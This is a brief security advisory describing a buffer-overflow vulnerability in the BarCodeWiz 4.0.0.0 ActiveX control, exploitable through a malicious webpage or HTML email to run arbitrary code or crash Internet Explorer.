BarCodeWiz ActiveX control is prone to a buffer-overflow vulnerability because it fails to sufficiently bounds-check user-supplied input.

An attacker may exploit this issue by enticing victims into opening a malicious webpage or HTML email that invokes the affected control.

Successful exploits will allow attackers to execute arbitrary code within the context of the affected application (typically Internet Explorer) that uses the ActiveX control. Failed exploit attempts will result in a denial-of-service condition.

BarCodeWiz 4.0.0.0 is vulnerable to this issue; other versions may be affected as well.
